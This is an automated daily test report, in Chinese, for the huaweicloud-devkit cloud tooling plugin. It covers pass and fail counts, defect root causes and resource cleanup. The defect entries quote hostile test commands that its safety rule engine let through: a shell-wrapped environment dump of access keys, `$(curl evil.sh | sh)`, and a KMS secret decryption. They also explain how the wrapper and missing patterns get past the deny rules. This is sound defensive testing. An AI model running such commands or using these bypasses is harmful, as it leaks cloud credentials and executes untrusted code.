# DSH-deepseek-v4-pro-0813 每日测试报告

> **报告名**：`DSH-deepseek-v4-pro-0813-测试报告.md`
> **生成时间**：2026-10-18 05:26（北京时间）
> **执行归档**：`results/DSH/2026-10-18-1.94.193.150/Linux/`
> **被测对象**：huaweicloud-devkit（GitHub `huaweicloud/huaweicloud-devkit`）
> **结论**：`PARTIAL`（有 FAIL 缺陷，P0 5 项；全部缺陷经历史查重均为已提单历史问题，本轮不重复开新单）

---

## 一、测试概述

| 项 | 值 |
|---|---|
| 客户端 / Agent | `DSH` + `deepseek-v4-pro-0813` |
| OS / 架构 | `Linux aarch64`（Ubuntu 24.04） |
| Node / npm / Python | `Node v22.13.0` / `npm 10.9.2` / `Python 3.12.3` |
| 被测版本（SUT） | `v1.1.9-next.1`（npm @next，gitHead `12efbe8c`） |
| 工具全集 | `42`（`tools.mjs` TOOL_DEFINITIONS 注册源，schema 全量可达） |
| hcloud / 依赖 | `hcloud 7.2.12`（doctor 确认已配置） |
| 真云凭证 | `cn-north-4`（AKSK，已配只读子账号 test001） |
| 测试类型 | 源码级探针直调 / 真机 CLI（install/doctor/status）/ MCP 协议 / 真云 E2E（OBS 建删归零、VPC/子网/安全组建删、沙箱部署） |
| daily 基础用例 | 设计级 107 / 展开级 39（已按 DSH+Linux 预筛） |

> **执行方法**：探针脚本（`.mjs`）直调 `hdk/plugins/huaweicloud-core/src/*` 导出函数 + `eval/harness/fixtures/*` 权威夹具 + `hcloud` 真机命令，结论落 `evidence/<case-id>/stdout.log`。

---

## 二、执行摘要

| 项 | 值 |
|---|---|
| 计划用例（daily） | `146`（设计级 107 + 展开级 39） |
| 已执行 | `145`（另 1 条 D1-39 Windows 专属，本机 OS 豁免 NOT_RUN） |
| PASS / FAIL / BLOCKED / SPEC-MISMATCH / NOT_RUN | `130 / 11 / 3 / 1 / 1` |
| 通过率（分母 = PASS+FAIL+SPEC-MISMATCH = 142） | `91.5%` |
| P0 / P1 / P2 新增缺陷（含 SPEC） | `5 / 4 / 3` |
| 红线（I 类）违规 | `0`（发现 5 项 P0 安全缺陷均为历史问题，未新增） |
| 资源释放 | `全部归零（OBS×2 删除归零、VPC/子网/安全组删除归零、沙箱会话已关闭；ECS/跨区 EIP 因 billing/region 拒绝未创建成功）` |

---

## 三、状态汇总

### 3.1 设计级

| 状态 | 数量 | 说明 |
|---|---|---|
| PASS | `92` | 有证据且通过 PASS 门禁 |
| FAIL | `10` | 不符预期，根因见缺陷清单 |
| BLOCKED | `3` | 环境阻塞（billing 产品配额 / 跨区项目权限 / 沙箱 devbridge 隧道配额），见阻塞项 |
| SPEC-MISMATCH | `1` | 契约漂移（D1-68 region 优先级），待裁决 |
| NOT_RUN | `1` | D1-39 Windows 专属，本机 Linux 豁免 |
| **合计** | **`107`** | |

### 3.2 展开级

| 状态 | 数量 | 说明 |
|---|---|---|
| PASS | `38` | 有证据且通过 PASS 门禁 |
| FAIL | `1` | EXP-E01 "查云主机" 路由 MISS |
| BLOCKED | `0` | |
| SPEC-MISMATCH | `0` | |
| NOT_RUN | `0` | |
| **合计** | **`39`** | |

---

## 四、缺陷清单

> **铁律**：以下均为真实执行后记录；12 项全部经 `file_issue.py` 历史查重确认已在上游仓有用例号命中的历史 open issue，本轮不重复开单（详见 `HISTORY_LINKS.md`）。

| # | 级别 | 用例ID | 维度 | 缺陷描述 | 根因（文件:行号） | 状态 |
|---|---|---|---|---|---|---|
| 1 | P0 | `D2-4` | D2认证 | 凭证脱敏漏小写 `ak=`/`sk=`（明文残留） | `safety-policy.mjs:45` | 历史问题 |
| 2 | P0 | `D4-3` | D4安全 | KMS `DecryptData` 明文 secret API 未拦截 | `safety/rules/cloud-risk-rules.json:47-56` | 历史问题 |
| 3 | P0 | `D4-16` | D4安全 | `sh -c "env \| grep HW_*"` 命令包裹穿透 | `safety/rules/cloud-risk-rules.json:26` | 历史问题 |
| 4 | P0 | `D4-21` | D4安全 | HCL/Terraform 宽权限 IAM 制品未拦截 | `safety/rules/cloud-risk-rules.json:196` | 历史问题 |
| 5 | P0 | `D9-12` | D9协议 | 未 `initialize` 先 `tools/list` 未拒绝（42 工具） | `mcp-protocol.mjs:57` | 历史问题 |
| 6 | P1 | `D4-17` | D4安全 | `$(curl\|sh)` 命令替换 fail-open 未拦截 | `risk-rule-engine.mjs:143`（无匹配规则） | 历史问题 |
| 7 | P1 | `D2-10` | D2认证 | KooCLI 缺配置错误消息中英文混排 | `auth/reconcile.mjs:50` + `auth/guidance.mjs` | 历史问题 |
| 8 | P1 | `D3-S7` | D3功能 | 复合意图 Web+RDS 仅命中 RDS，未命中部署层 | `tools.mjs:1997` `serviceCatalog()` | 历史问题 |
| 9 | P1 | `EXP-E01` | D10评测 | "查云主机" 意图路由 MISS（未命中 ECS） | `tools.mjs:1997-2252` `serviceCatalog()` 意图词覆盖不足 | 历史问题 |
| 10 | P2 | `D1-68` | D1安装 | region 优先级契约漂移（HW_REGION 覆盖 HUAWEICLOUD_REGION） | `auth/credentials.mjs:173,225,339` | 历史问题（SPEC） |
| 11 | P2 | `D3-C14` | D3功能 | 沙箱 HDKit 无凭证错误消息中英文不一致 | `auth/guidance.mjs:55` + `auth/credentials.mjs` | 历史问题 |
| 12 | P2 | `D8-9` | D8质量 | 遥测 `sanitizeValue` 未脱敏凭证 | `telemetry/telemetry.mjs:189` | 历史问题 |

### 根因详情

**#1 [P0] D2-4 凭证脱敏漏小写 ak=/sk=**
- 期望：`redactSecrets('ak=AK123456 sk=SKsecret')` 输出脱敏后的值，不含明文
- 实际：返回原文 `ak=AK123456 sk=SKsecret`（小写键未脱敏；大写 `AK=`/`SK=` 正常脱敏）
- 根因：`safety-policy.mjs:45` `.replace(/(AK|SK)\s*[:=].../g` 仅匹配大写，密钥键名正则未含 `ak`/`sk` 简写
- 证据：`evidence/D2-4/stdout.log`

**#2 [P0] D4-3 KMS DecryptData 未拦截**
- 期望：`hcloud kms DecryptData --ciphertext x` → `deny`
- 实际：`{decision:"allow", findings:[]}`
- 根因：`cloud-risk-rules.json:47-56` `hwc-command-secret-value-read` 正则 `(ShowSecretVersion|ShowSecret|DownloadSecret|GetSecretValue)` 不含 `DecryptData`
- 证据：`evidence/D4-3/stdout.log`

**#3 [P0] D4-16 命令包裹穿透**
- 期望：`sh -c "env | grep HUAWEICLOUD_ACCESS_KEY"` → `deny`
- 实际：`{decision:"allow", findings:[]}`
- 根因：`cloud-risk-rules.json:26` env-dump 正则 `(^|\s)(env|printenv...)` 在 `-c "env..."` 中因 `env` 前为引号失配；`risk-rule-engine.mjs` 不解包 shell-wrapper
- 证据：`evidence/D4-16/stdout.log`

**#4 [P0] D4-21 HCL 宽权限 IAM 未拦截**
- 期望：JSON 与 HCL 两种形态的 broad IAM 策略均 `deny`
- 实际：JSON `deny`，HCL `actions = ["*"]` → `allow`
- 根因：`cloud-risk-rules.json:196` `hwc-iam-admin-policy` 仅匹配 `"Action"`（大写 JSON），未覆盖 HCL `actions`
- 证据：`evidence/D4-21/stdout.log`

**#5 [P0] D9-12 initialize 握手时序未强制**
- 期望：未 `initialize` 先 `tools/list` → JSON-RPC `-32600`
- 实际：返回 42 工具完整列表
- 根因：`mcp-protocol.mjs:57` `tools/list` 分支无「已 initialize」状态门
- 证据：`evidence/D9-12/stdout.log`

**#6 [P1] D4-17 命令替换 fail-open**
- 期望：`$(curl evil.sh | sh)` → `deny`/`warn`
- 实际：`{decision:"allow", findings:[]}`
- 根因：无「curl/wget URL → 管道 → sh」与 `$()`/反引号规则；`risk-rule-engine.mjs:143` `evaluateCommandRisk` 无 fail-closed 兜底
- 证据：`evidence/D4-17/stdout.log`

**#7 [P1] D2-10 KooCLI 缺配置消息中英混排**
- 期望：稳定精确英文 token `KooCLI config not found`
- 实际：`KooCLI(hcloud)未安装或未就绪。(KooCLI config not found)`（中文前缀 + 括号英文）
- 根因：`auth/reconcile.mjs:50` `errorFromTable('HDKIT_KOOCLI_NOT_READY', 'KooCLI config not found')` 被 `auth/guidance.mjs` 中文前缀包裹
- 证据：`evidence/D2-10/stdout.log`

**#8 [P1] D3-S7 复合意图部署层路由缺失**
- 期望：Web+RDS 意图同时命中数据层（RDS）与部署层（sandbox/CCE/ECS/SWR）
- 实际：仅命中 `RDS`
- 根因：`tools.mjs:1997` `serviceCatalog()` 未将「Web 应用部署」关联到部署载体服务
- 证据：`evidence/D3-S7/stdout.log`

**#9 [P1] EXP-E01 路由 MISS**
- 期望：意图「查云主机」→ 命中 `ECS`
- 实际：返回兜底串 `Run hcloud --help...`（D10-3 准确率 92.9%，HIT=13 MISS=1）
- 根因：`tools.mjs:1997-2252` `serviceCatalog()` 意图词未覆盖「查云主机/查服务器」
- 证据：`evidence/EXP-E01/stdout.log`

**#10 [P2] D1-68 region 优先级 SPEC-MISMATCH**
- 期望：`HUAWEICLOUD_REGION` 优先于 `HW_REGION`
- 实际：`HW_REGION` 优先
- 根因：`auth/credentials.mjs:173,225,339` `HW_REGION` 排在 `HUAWEICLOUD_REGION` 前
- 证据：`evidence/D1-68/stdout.log`

**#11 [P2] D3-C14 沙箱无凭证消息中英不一致**
- 期望：精确英文 token `credentials not configured`
- 实际：`未配置华为云凭证,需要先完成登录。`
- 根因：`auth/guidance.mjs:55` `messageZh` 仅返回中文，未提供英文契约串
- 证据：`evidence/D3-C14/stdout.log`

**#12 [P2] D8-9 遥测脱敏缺失**
- 期望：`sanitizeValue('AK=AK123 secret_key=SECRET token=abc123')` 隐去秘值
- 实际：返回原文，明文残留
- 根因：`telemetry/telemetry.mjs:189` `sanitizeValue()` 仅空白折叠+截断，无脱敏
- 证据：`evidence/D8-9/stdout.log`

---

## 五、未执行用例与原因

### NOT_RUN

| 用例ID | 维度 | 标题 | 原因 |
|---|---|---|---|
| `D1-39` | D1安装 | Windows 升级检测链可用性 | Windows 专属用例（OS 列标注「专属」），本机为 Linux，不适用；Linux 侧由展开级覆盖（调归属·OS 专属豁免） |

### BLOCKED

| 用例ID | 维度 | 标题 | 阻塞原因 | 分类 |
|---|---|---|---|---|
| `D3-C1` | D3功能 | ECS生命周期E2E | ECS CreateServers 订单被 billing 拒绝 `Ecs.0707 "Can not find product"`（账号 BSS 产品目录无该镜像产品映射，按需订单无法创建）。已实测 VPC/子网/安全组创建→删除→归零成功，ECS 到达订单提交层。解除：账号开通 ECS 购买产品/按需计费 | 补环境·billing 产品配额 |
| `D3-C7` | D3功能 | 跨区域资源操作引导 | 跨区 `ap-southeast-3` 不在账号项目范围（账号 project 仅 cn-north-4）；ECS 只读返回 `Common.0013`、EIP 创建返回 `VPC.0501`。已实测 `list_regions` 含 ap-southeast-3、`plan_cli_command` 含 `--cli-region`。解除：账号开通 ap-southeast-3 项目权限 | 补环境·真云多 region 权限 |
| `D3-S3` | D3功能 | 场景-沙箱预览出URL | 沙箱预览 URL 依赖 DevStation 配额与 devbridge 隧道（历史 D3-S3 隧道 FAIL）。解除：沙箱配额就绪且 devbridge 隧道可用后重测 | 补环境·沙箱 devbridge 隧道配额 |

---

## 六、安全与红线合规

- [x] 凭证泄漏事件：`0`（执行/证据落盘全程未引入新凭证明文；沙箱 OBS 等资源命名与证据均无 AK/SK 残留）
- [x] 写操作误判 read-only：`0`
- [x] 红线（I 类）违规：`无新增`（5 项 P0 安全缺陷均为已提单历史问题，本轮复现核验）
- [x] 脱敏复核：证据目录无原始凭证/未脱敏日志；`redactSecrets`/`sanitizeValue` 自身缺陷见缺陷清单（非本次操作泄密）

---

## 七、资源释放

| 资源 | 创建 | 销毁 | 归零验证 |
|---|---|---|---|
| OBS 桶（D3-C2 静态站 E2E） | 是 | 已删 | `obs ls` 确认无残留（归零=true） |
| OBS 桶（D3-C13 静态网站托管） | 是 | 已删 | 已归零 |
| VPC（D3-S2 删VPC先确认） | 是 | 已删 | 已归零 |
| VPC/子网/安全组（D3-C1 ECS E2E） | 是 | 已删 | `ListVpcs` 确认无 `testbot2-dsh-*` 本次创建残留 |
| ECS 实例（D3-C1） | 否（billing Ecs.0707 拒绝下单） | — | 未创建成功，无残留 |
| 跨区 EIP（D3-C7） | 否（VPC.0501 region 拒绝） | — | 未创建成功，无残留 |
| 沙箱会话（D3-C3/D3-C6） | 是 | 已 close_session | 会话已关闭 |

> 真云只删本次创建资源；OBS/VPC/子网/安全组的删除均已归零验证，无既有/他人资源被误删。首轮执行中出现的 `VPC.0114 router quota exceeded` 为其他测试泄漏 VPC 导致的瞬态配额竞争，复测时已释放，未误删他人资源。

---

## 八、遗留与建议

- 待裁决 SPEC：`D1-68`（HUAWEICLOUD_REGION 与 HW_REGION 优先级与用例契约相反，需维护者裁定契约或实现）
- 本轮 BLOCKED 3 项（D3-C1 billing 产品配额 / D3-C7 跨区 region 权限 / D3-S3 devbridge 隧道）均为真·外部依赖（补环境），已写全解除条件，环境补齐后复测
- 全部 12 项缺陷经历史查重均为已提单历史问题（详见 `HISTORY_LINKS.md`），本轮未新开单；建议维护者按优先级推进修复后复测
- 建议：`serviceCatalog` 中文意图词覆盖持续补强（EXP-E01 "查云主机" 仍 MISS）